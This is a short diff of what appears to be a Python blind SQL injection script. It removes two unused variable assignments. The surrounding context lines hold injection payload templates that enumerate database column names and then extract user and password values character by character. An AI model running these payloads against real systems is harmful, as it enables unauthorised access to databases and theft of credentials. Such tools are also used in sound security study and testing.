@@ -74,7 +74,7 @@ if __name__ == "__main__":
     query = "1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {}, 1),{},1)='{}'%23"
     
     found_columns = [[] for _ in range(n_columns)]
-    completion = ""
+    
     print("[!] In order to speed up, try to press CTRL+C when you find the user and password columns")
     try:
         for i in range(n_columns):        
@@ -95,7 +95,7 @@ if __name__ == "__main__":
     query = "1' AND SUBSTR((SELECT {} FROM {} LIMIT {}, 1),{},1)='{}'%23"
     
     found_users = [[] for _ in range(10)]
-    completion = ""
+    
     print("[!] In order to speed up, try to press CTRL+C when you find the target user")
     try:
         for i in range(10):        
